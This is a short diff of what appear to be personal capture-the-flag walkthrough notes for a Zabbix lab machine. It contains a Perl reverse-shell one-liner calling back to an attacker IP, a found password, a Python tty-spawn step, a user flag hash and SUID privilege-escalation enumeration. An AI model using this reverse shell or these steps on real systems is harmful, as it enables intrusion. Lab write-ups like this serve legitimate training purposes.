@@ -1645,7 +1645,7 @@ perl -e 'use Socket;$i="10.10.15.166";$p=444;socket(S,PF_INET,SOCK_STREAM,getpro
 found a passwd ZippityDoDah
 12)now get a reverse shell for zabbix agent and once login spawn a tty shell with
 python3 -c 'import pty; pty.spawn("/bin/sh")''
-13)grab the user flag
+13)grab the user flag.aa29e93f48c64f8586448b6f6e38fe33
 14)copy the ssh key for a stable shell
 15)looking for basic privilege scalation an enumeration.
 we see theres a binary with root privileges that SUID enabled
